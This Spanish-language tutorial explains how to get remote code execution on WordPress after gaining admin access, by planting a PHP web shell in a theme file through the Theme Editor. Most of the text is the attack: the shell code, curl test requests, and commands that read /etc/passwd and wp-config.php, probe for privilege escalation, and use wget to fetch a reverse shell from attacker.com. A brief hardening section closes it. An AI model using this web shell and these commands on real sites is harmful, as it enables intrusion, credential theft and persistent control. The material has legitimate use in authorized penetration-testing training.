### **Ejecución Remota de Código (RCE) en WordPress mediante el Editor de Temas**

---

### **Ataque al Backend de WordPress**

Si un atacante obtiene **acceso administrativo** al panel de WordPress, puede modificar archivos PHP para ejecutar comandos en el sistema operativo. Una forma común de hacerlo es mediante el **Editor de Temas**, que permite modificar directamente el código fuente de los archivos del tema activo o inactivo.

---

### **Pasos para Explotar RCE mediante el Editor de Temas**

#### **1️⃣ Acceder al Panel de Administración**

Iniciar sesión con credenciales administrativas obtenidas previamente (por ejemplo, mediante un ataque de fuerza bruta o credenciales filtradas).

#### **2️⃣ Abrir el Editor de Temas**

1. Navegar a **Apariencia → Editor de Temas**.
2. Identificar el tema activo (por ejemplo, `Transportex`).
3. Seleccionar un **tema inactivo** (por ejemplo, `Twenty Seventeen`) para evitar dañar el sitio principal.

#### **3️⃣ Editar un Archivo PHP Menos Crítico**

Para evitar afectar la funcionalidad del sitio, modificar un archivo que rara vez se usa, como `404.php`.

#### **4️⃣ Inyectar Código Malicioso (Web Shell)**

Agregar el siguiente código PHP para permitir la ejecución de comandos:

```php
<?php
system($_GET['cmd']);
?>
```

Este código permite ejecutar comandos del sistema a través del parámetro `cmd` en la URL.

---

### **Validación de la Ejecución Remota de Código (RCE)**

1. Acceder al archivo modificado desde el navegador:
    
    ```plaintext
    http://<objetivo>/wp-content/themes/twentyseventeen/404.php?cmd=id
    ```
    
    **Salida esperada:**
    
    ```plaintext
    uid=1000(wp-user) gid=1000(wp-user) groups=1000(wp-user)
    ```
    
2. Alternativamente, usar `cURL` desde la terminal:
    
    ```bash
    curl -X GET "http://<objetivo>/wp-content/themes/twentyseventeen/404.php?cmd=id"
    ```
    

---

### **Ejemplos de Comandos Usando la Web Shell**

Una vez que se confirma la ejecución de comandos, se pueden realizar acciones adicionales:

|Comando|Descripción|
|---|---|
|`cmd=id`|Ver usuario actual|
|`cmd=whoami`|Ver nombre del usuario en ejecución|
|`cmd=uname -a`|Obtener información del sistema|
|`cmd=ls -la /var/www/html`|Listar archivos del directorio web|
|`cmd=cat /etc/passwd`|Leer la lista de usuarios del sistema|
|`cmd=wget http://attacker.com/shell.php -O shell.php`|Descargar una **web shell** más avanzada|

---

### **Ataques Avanzados desde RCE**

1. **Obtener acceso persistente**
    
    - Subir un **web shell** más completo como `PentestMonkey PHP Reverse Shell`:
        
        ```bash
        cmd=wget http://<attacker-ip>/shell.php -O /var/www/html/shell.php
        ```
        
2. **Escalada de Privilegios**
    
    - Buscar archivos con permisos `SUID`:
        
        ```bash
        cmd=find / -perm -4000 2>/dev/null
        ```
        
    - Intentar **sudo** sin contraseña:
        
        ```bash
        cmd=sudo -l
        ```
        
3. **Pivoting y Movimientos Laterales**
    
    - Identificar conexiones activas:
        
        ```bash
        cmd=netstat -antp
        ```
        
    - Extraer credenciales almacenadas:
        
        ```bash
        cmd=cat /wp-config.php
        ```
        

---

## **Medidas de Seguridad para Prevenir este Ataque**

✔ **Deshabilitar el Editor de Temas**  
Agregar esta línea en `wp-config.php`:

```php
define('DISALLOW_FILE_EDIT', true);
```

✔ **Restringir permisos de escritura en archivos PHP**  
Configurar permisos correctos en temas y plugins:

```bash
chmod -R 444 wp-content/themes/
chmod -R 444 wp-content/plugins/
```

✔ **Monitorear archivos modificados**  
Usar herramientas como `inotify` o `Auditd` para detectar cambios en archivos críticos.

✔ **Configurar ModSecurity**  
Agregar reglas para bloquear el uso de parámetros como `cmd=` en URLs.

✔ **Mantener WordPress y Plugins Actualizados**  
Los atacantes suelen explotar vulnerabilidades en versiones antiguas.

---

### **Conclusión**

Si un atacante obtiene acceso de administrador en WordPress, puede ejecutar comandos en el sistema mediante el Editor de Temas. Para mitigar esta amenaza, es crucial **deshabilitar el editor, restringir permisos en archivos PHP y monitorear cambios en el sistema**.